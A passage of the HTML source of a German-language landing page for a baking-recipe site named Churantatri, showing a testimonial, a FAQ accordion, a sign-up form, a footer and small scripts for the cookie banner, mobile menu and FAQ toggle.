          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Als Mutter von drei Kindern liebe ich es, gemeinsam mit meiner Familie zu backen. Churantatri bietet so viele tolle Cake Recipes für jedes Niveau. Die Rezepte gelingen immer, und meine Kinder helfen begeistert mit. Die Community ist außerdem super freundlich und hilfsbereit – ich fühle mich hier wirklich willkommen."</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar3.jpg" alt="Lena Wagner" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Lena Wagner</div>
            <div class="text-xs text-gray-400">Familienbäckerin aus Hamburg</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- FAQ -->
<section id="faq" class="py-20 bg-white">
  <div class="max-w-3xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Häufige Fragen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Antworten auf Ihre Fragen rund ums Backen</h2>
    </div>
    <div class="space-y-4">
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Für wen sind die Rezepte bei Churantatri geeignet?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Unsere Rezepte richten sich an alle – vom absoluten Backanfänger bis zum erfahrenen Hobbybäcker. Jedes Rezept ist klar nach Schwierigkeitsgrad kategorisiert, sodass Sie immer das passende Cake Recipe oder Pastry-Rezept für Ihr Niveau finden.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Welche Backrezepte finde ich auf Churantatri?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Wir bieten eine riesige Auswahl an Cake Recipes, Pastry Recipes, Macaron-Anleitungen und vieles mehr. Von klassischen deutschen Torten über französische Feingebäcke bis zu modernen Trenddesserts – bei uns finden Sie garantiert das Richtige für jeden Anlass.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Brauche ich teure Ausstattung, um die Rezepte nachzubacken?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Nein! Unsere Home-Bake-Rezepte sind speziell für die normale Haushaltsküche entwickelt. Wir erklären immer, welche Materialien benötigt werden, und geben Tipps für günstige Alternativen. So können Sie Bäckerei-Stil-Ergebnisse ohne Profiausrüstung erzielen.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie oft werden neue Rezepte hinzugefügt?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Wir erweitern unsere Rezeptsammlung wöchentlich um neue Inhalte. Abonnieren Sie unseren Newsletter, um keine neuen Cake Recipes, Macaron-Anleitungen oder Pastry Recipes zu verpassen und immer auf dem neuesten Stand der Backinspirationen zu bleiben.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Kann ich meine eigenen Rezepte mit der Community teilen?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Ja, auf Churantatri können Sie Ihre eigenen Backkreationen hochladen und mit unserer Community teilen. Tauschen Sie Tipps aus, erhalten Sie Feedback von anderen Hobbybäckern und inspirieren Sie sich gegenseitig für neue Cake Recipes und Backtechniken.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Sind die Rezepte und Anleitungen kostenlos?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Viele unserer Rezepte und Grundanleitungen sind kostenlos verfügbar. Für exklusive Video-Tutorials, detaillierte Backkurse und Premium-Pastry Recipes bieten wir ein Abonnement an, das Ihnen unbegrenzten Zugang zu unserem gesamten Inhaltsangebot ermöglicht.</div>
      </div>
      <div class="border border-gray-200 rounded-xl overflow-hidden">
        <button onclick="toggleFaq(this)" class="w-full flex justify-between items-center px-6 py-4 text-left font-semibold text-gray-900 hover:bg-gray-50 transition">
          <span>Wie funktionieren die Online-Backkurse bei Churantatri?</span>
          <svg class="w-5 h-5 text-gray-400 shrink-0 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div class="faq-answer px-6 pb-4 text-gray-600 text-sm leading-relaxed">Unsere Online-Backkurse sind vollständig digital und können jederzeit und überall abgerufen werden. Sie bestehen aus Video-Lektionen, schriftlichen Rezepten und interaktiven Übungsaufgaben. Nach Abschluss erhalten Sie ein Zertifikat und können Ihr Wissen in unserer Community weitergeben.</div>
      </div>
    </div>
  </div>
</section>

<!-- CTA -->
<section id="cta" class="py-20 bg-primary">
  <div class="max-w-3xl mx-auto px-4 text-center">
    <h2 class="text-3xl md:text-4xl font-bold text-white mb-4">Starten Sie noch heute Ihr Backabenteuer!</h2>
    <p class="text-white/80 mb-8 text-lg">Melden Sie sich jetzt an und erhalten Sie Zugang zu hunderten von Cake Recipes, Macaron-Anleitungen und Pastry-Rezepten.</p>
    <form class="flex flex-col sm:flex-row gap-3 max-w-md mx-auto" onsubmit="return false;">
      <input type="text" placeholder="Ihr Name" class="flex-1 px-4 py-3 rounded-xl text-gray-900 focus:outline-none" required>
      <input type="email" placeholder="Ihre E-Mail-Adresse" class="flex-1 px-4 py-3 rounded-xl text-gray-900 focus:outline-none" required>
      <button type="submit" class="px-6 py-3 bg-white font-semibold rounded-xl hover:bg-gray-100 transition" style="color: #6366F1;">Jetzt kostenlos anmelden</button>
    </form>
    <p class="text-white/60 text-xs mt-4">Ihre Daten sind bei uns sicher. Weitere Infos in unserer <a href="privacy-policy.html" class="underline text-white/80">Datenschutzerklärung</a></p>
  </div>
</section>

<!-- Disclaimer (для медицины/финансов/юридических тем) -->


<!-- Footer -->
<footer id="main-footer" class="bg-gray-900 text-gray-400 py-12">
  <div class="max-w-6xl mx-auto px-4">
    <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
      <div class="md:col-span-2">
        <div class="text-white font-bold text-xl mb-3">Churantatri</div>
        <p class="text-sm leading-relaxed max-w-xs">Churantatri ist Ihre Plattform für köstliche Cake Recipes, Pastry-Rezepte und Macaron-Anleitungen im Bäckerei-Stil.</p>
        <div class="mt-4 text-sm space-y-1">
          <div>📍 Bäckerstraße 42, 10117 Berlin, Deutschland</div>
          <div>📞 +49 30 12345678</div>
          <div>✉️ info@churantatri-site.com</div>
        </div>
      </div>
      <div>
        <div class="text-white font-semibold mb-3">Navigation</div>
        <ul class="space-y-2 text-sm">
          <li><a href="/" class="hover:text-white transition">Startseite</a></li>
          <li><a href="about.html" class="hover:text-white transition">Über uns</a></li>
          <li><a href="contact.html" class="hover:text-white transition">Kontakt</a></li>
        </ul>
      </div>
      <div>
        <div class="text-white font-semibold mb-3">Rechtliches</div>
        <ul class="space-y-2 text-sm">
          <li><a href="privacy-policy.html" class="hover:text-white transition">Datenschutz</a></li>
          <li><a href="terms.html" class="hover:text-white transition">Nutzungsbedingungen</a></li>
        </ul>
      </div>
    </div>
    <div class="border-t border-gray-800 pt-6 text-sm text-center">
      © 2025 Churantatri. Alle Rechte vorbehalten.
    </div>
  </div>
</footer>

<script>
  // Cookie banner
  function acceptCookies(type) {
    localStorage.setItem('cookies_accepted', type);
    document.getElementById('cookie-banner').style.display = 'none';
  }
  window.addEventListener('DOMContentLoaded', function() {
    if (!localStorage.getItem('cookies_accepted')) {
      document.getElementById('cookie-banner').style.display = 'block';
    }
  });

  // Mobile menu
  function toggleMenu() {
    var m = document.getElementById('mobile-menu');
    m.classList.toggle('hidden');
  }

  // FAQ accordion
  function toggleFaq(btn) {
    var answer = btn.nextElementSibling;
    var icon = btn.querySelector('svg');
    answer.classList.toggle('open');
    icon.style.transform = answer.classList.contains('open') ? 'rotate(180deg)' : '';
  }
</script>
</body>
</html>
